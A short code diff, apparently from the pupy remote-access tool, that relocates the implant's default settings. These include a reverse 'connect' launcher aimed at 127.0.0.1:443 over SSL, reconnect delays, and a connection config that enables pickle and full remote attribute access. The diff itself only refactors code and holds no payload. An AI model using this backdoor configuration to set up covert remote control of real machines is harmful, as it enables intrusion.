@@ -460,37 +460,14 @@ def safe_obtain(proxy):
         )
     ) # should prevent any code execution
 
-debug = False
-CONFIGURATION_CID = 0x31337
-DELAYS = [(10, 5, 10), (50, 30, 50), (-1, 150, 300)]
-
-LAUNCHER = "connect"  # the default launcher to start when no argv
-# default launcher arguments
-LAUNCHER_ARGS = shlex.split("--host 127.0.0.1:443 --transport ssl")
-
-REVERSE_SLAVE_CONF = dict(
-    allow_all_attrs=True,
-    allow_public_attrs=True,
-    allow_pickle=True,
-    allow_getattr=True,
-    allow_setattr=True,
-    allow_delattr=True,
-    import_custom_exceptions=False,
-    propagate_SystemExit_locally=True,
-    propagate_KeyboardInterrupt_locally=True,
-    instantiate_custom_exceptions=True,
-    instantiate_oldstyle_exceptions=True,
-)
-
-setattr(sys, 'terminated', False)
-setattr(sys, 'terminate', None)
-
 setattr(pupy, 'manager', Manager(PStore()))
 setattr(pupy, 'Task', Task)
 setattr(pupy, 'connected', False)
 setattr(pupy, 'obtain', safe_obtain) # I don't see a better spot to put this util
-setattr(pupy, 'cid', CONFIGURATION_CID)
 setattr(pupy, 'creds_cache', {})
+setattr(sys, 'terminated', False)
+setattr(sys, 'terminate', None)
+setattr(pupy, 'cid', None)
 
 class UpdatableModuleNamespace(ModuleNamespace):
     __slots__ = ['__invalidate__']
@@ -700,6 +677,30 @@ def handle_sigterm(*args):
     os._exit(0)
 
 attempt = 0
+
+debug = False
+CONFIGURATION_CID = 0x31337
+DELAYS = [(10, 5, 10), (50, 30, 50), (-1, 150, 300)]
+
+LAUNCHER = "connect"  # the default launcher to start when no argv
+# default launcher arguments
+LAUNCHER_ARGS = shlex.split("--host 127.0.0.1:443 --transport ssl")
+
+REVERSE_SLAVE_CONF = dict(
+    allow_all_attrs=True,
+    allow_public_attrs=True,
+    allow_pickle=True,
+    allow_getattr=True,
+    allow_setattr=True,
+    allow_delattr=True,
+    import_custom_exceptions=False,
+    propagate_SystemExit_locally=True,
+    propagate_KeyboardInterrupt_locally=True,
+    instantiate_custom_exceptions=True,
+    instantiate_oldstyle_exceptions=True,
+)
+
+setattr(pupy, 'cid', CONFIGURATION_CID)
 
 def main():
     global LAUNCHER
